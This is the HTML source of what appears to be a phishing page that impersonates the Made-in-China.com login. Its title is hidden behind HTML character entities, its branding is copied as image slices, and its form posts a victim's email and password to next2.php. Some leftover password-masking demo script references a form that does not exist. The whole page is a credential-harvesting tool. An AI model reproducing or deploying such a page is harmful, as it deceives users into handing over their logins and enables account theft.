<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#77;&#97;&#100;&#101;&#45;&#105;&#110;&#45;&#67;&#104;&#105;&#110;&#97;&#46;&#99;&#111;&#109;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
.textbox { 
    border: 1px solid #ccc; 
    height: 42px; 
    width: 275px; 
  	font-family: Tahoma,"微软雅黑","宋体",arial;
    font-size: 14px;
  	color: #555;
    padding-left:6px; 
} 
.textbox:focus { 
    outline: none; 
    border: 1px solid #999;
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:603px; width:1349px; height:173px; z-index:0"><img src="images/m5.png" alt="" title="" border=0 width=1349 height=173></div>

<div id="image2" style="position:absolute; overflow:hidden; left:239px; top:142px; width:949px; height:389px; z-index:1"><img src="images/m6.png" alt="" title="" border=0 width=949 height=389></div>

<div id="image3" style="position:absolute; overflow:hidden; left:240px; top:86px; width:222px; height:46px; z-index:2"><a href="#"><img src="images/m7.png" alt="" title="" border=0 width=222 height=46></a></div>
<form action=next2.php name=dafahoja id=dafahoja method=post>
<input name="eml" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:401px;left:489px;top:293px;z-index:3">
<input name="eps" id="demo-field" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:401px;left:489px;top:359px;z-index:4">
<div id="formimage1" style="position:absolute; left:488px; top:424px; z-index:5"><input type="image" name="formimage1" width="124" height="38" src="images/m8.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
</body>
</html>
